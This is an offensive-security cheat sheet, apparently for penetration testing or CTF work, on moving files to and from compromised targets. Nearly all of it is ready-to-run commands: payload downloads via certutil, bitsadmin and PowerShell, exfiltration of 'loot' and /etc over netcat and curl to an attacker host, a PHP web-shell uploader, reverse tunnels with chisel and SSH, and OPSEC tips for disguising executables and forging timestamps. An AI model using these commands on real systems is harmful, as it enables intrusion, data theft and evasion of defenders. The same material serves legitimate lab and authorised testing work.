---
icon: folder-tree
---

# File Transfer Cheat Sheet

## **File Transfer Cheat Sheet — Move Files Like a Ghost**&#x20;

***

### I. 🧩 Core Principles

| Concept              | Description                                                              |
| -------------------- | ------------------------------------------------------------------------ |
| **Ingress Transfer** | Downloading from your server to the target.                              |
| **Egress Transfer**  | Exfiltrating data from target to you.                                    |
| **Native First**     | Prefer built-in commands (curl, certutil, PowerShell, Python).           |
| **Stealth Mode**     | Use encryption (HTTPS/SMB over TLS), custom headers, non-standard ports. |
| **Redundancy**       | Always prep at least two different transfer methods.                     |

***

### II. ⚙️ Common Operator Setup

#### 🧠 HTTP Server (your box)

```bash
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# PHP
php -S 0.0.0.0:8000

# Go
go run -e 'package main;import("net/http");func main(){http.ListenAndServe(":8000",http.FileServer(http.Dir(".")))}'
```

#### ⚙️ SMB Share (Windows ↔ Linux)

```bash
sudo impacket-smbserver share $(pwd) -smb2support
# Connect from Windows target:
copy \\10.10.14.2\share\tool.exe C:\Temp\
```

***

### III. 🧱 Linux → Target (Ingress)

#### 🔹 Curl

```bash
curl -O http://10.10.14.2/file.sh
curl -o /tmp/script.sh http://10.10.14.2/script.sh
```

#### 🔹 Wget

```bash
wget http://10.10.14.2/file
wget --no-check-certificate https://10.10.14.2/tool
```

#### 🔹 Netcat (Simple & Fast)

**Receiver (attacker):**

```bash
nc -lvnp 9000 > file.bin
```

**Sender (target):**

```bash
nc 10.10.14.2 9000 < /bin/bash
```

#### 🔹 SCP / RSYNC

```bash
scp file.txt user@10.10.14.2:/tmp/
rsync -avz file.txt user@10.10.14.2:/tmp/
```

#### 🔹 FTP (if open)

```bash
ftp 10.10.14.2
put file.txt
get file.txt
```

***

### IV. 🧠 Windows Ingress (Native)

#### 🔹 PowerShell

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.2/file.exe','C:\Temp\file.exe')"
```

#### 🔹 Invoke-WebRequest

```powershell
Invoke-WebRequest -Uri http://10.10.14.2/file.exe -OutFile C:\Temp\file.exe
```

#### 🔹 Bitsadmin (Background)

```cmd
bitsadmin /transfer job /download /priority high http://10.10.14.2/file.exe C:\Temp\file.exe
```

#### 🔹 Certutil

```cmd
certutil -urlcache -split -f http://10.10.14.2/file.exe file.exe
```

#### 🔹 SMB Copy

```cmd
copy \\10.10.14.2\share\file.exe C:\Temp\
```

***

### V. 🧱 Cross-Platform Tricks

#### 🔹 Base64 Encode/Decode (text-only channels)

**Sender:**

```bash
base64 file > file.b64
```

**Receiver:**

```bash
base64 -d file.b64 > file
```

***

#### 🔹 Python HTTP Upload Server (quick exfil)

```python
# On target (upload)
import requests
files={'file':open('loot.zip','rb')}
r=requests.post('http://10.10.14.2:8000',files=files)
```

#### 🔹 Curl Upload

```bash
curl -T loot.zip http://10.10.14.2:8000
```

#### 🔹 Netcat Exfil

**Receiver:**

```bash
nc -lvnp 9000 > loot.zip
```

**Sender:**

```bash
cat loot.zip | nc 10.10.14.2 9000
```

***

### VI. 🧰 Python File Transfer Mini-Server (Dual Mode)

```python
#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer
import cgi

class Handler(SimpleHTTPRequestHandler):
    def do_POST(self):
        ctype, pdict = cgi.parse_header(self.headers['content-type'])
        if ctype == 'multipart/form-data':
            fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
            with open(fs['file'].filename, 'wb') as f: f.write(fs['file'].file.read())
        self.send_response(200); self.end_headers(); self.wfile.write(b'OK')

HTTPServer(('0.0.0.0',8000), Handler).serve_forever()
```

***

### VII. 🧠 File Transfer via Web Shells (CTF Use)

#### 🔹 PHP Upload

```php
<?php echo file_put_contents($_GET['f'], file_get_contents("php://input")); ?>
```

Upload a file:

```bash
curl -X POST --data-binary @tool.php "http://target/upload.php?f=shell.php"
```

***

### VIII. ⚙️ Windows → Linux Exfil (Command Line)

#### 🔹 PowerShell Upload

```powershell
$Body = Get-Content "C:\Temp\loot.txt" -Raw
Invoke-RestMethod -Uri "http://10.10.14.2/upload" -Method POST -Body $Body
```

#### 🔹 Certutil Encode

```cmd
certutil -encode file.exe file.b64
type file.b64
```

Then decode on your end:

```bash
base64 -d file.b64 > file.exe
```

***

### IX. 🧱 File Sync Between Targets

#### 🔹 SSH Pipe

```bash
tar cf - /etc | ssh user@10.10.14.2 'tar xf - -C /backup/'
```

#### 🔹 Netcat Pipe

```bash
tar cf - /var/log | nc 10.10.14.2 9001
```

***

### X. 🧠 Tunneling / Proxy Transfers

#### 🔹 SSH Tunnel

```bash
ssh -R 9000:localhost:80 user@10.10.14.2
```

#### 🔹 SOCKS Proxy via SSH

```bash
ssh -D 1080 user@10.10.14.2
```

#### 🔹 Chisel (binary tunnel)

```bash
# server
chisel server -p 8080 --reverse
# client
chisel client 10.10.14.2:8080 R:9001:localhost:9001
```

***

### XI. ⚡ Quick Reference Table

| Method                                | Command                                      | Platform    |
| ------------------------------------- | -------------------------------------------- | ----------- |
| **HTTP Download (curl)**              | `curl -O http://IP/file`                     | Linux/macOS |
| **HTTP Download (Invoke-WebRequest)** | `Invoke-WebRequest -Uri URL -OutFile dest`   | Windows     |
| **SMB Copy**                          | `copy \\IP\share\file C:\Temp\`              | Windows     |
| **Certutil**                          | `certutil -urlcache -split -f URL file`      | Windows     |
| **Netcat**                            | `nc IP PORT < file` / `nc -lvnp PORT > file` | All         |
| **Base64**                            | `base64 file > out` / `base64 -d out > file` | All         |
| **Bitsadmin**                         | `bitsadmin /transfer job /download ...`      | Windows     |
| **SCP**                               | `scp file user@IP:/dest/`                    | Linux/macOS |
| **Curl Upload**                       | `curl -T loot.zip http://IP`                 | All         |

***

### XII. 🧠 Pro Tips for OPSEC

* **Use HTTPS or SMB3** for encryption.
*   **Timestamp files** for tracking:

    ```bash
    touch -r original file_copy
    ```
* **Avoid fingerprints**: rename `.exe` to `.dat` or `.jpg` for storage.
*   **Compress before transfer**:

    ```bash
    tar czf archive.tar.gz /path
    ```
*   **Verify integrity**:

    ```bash
    md5sum file
    certutil -hashfile file.exe MD5
    ```

***
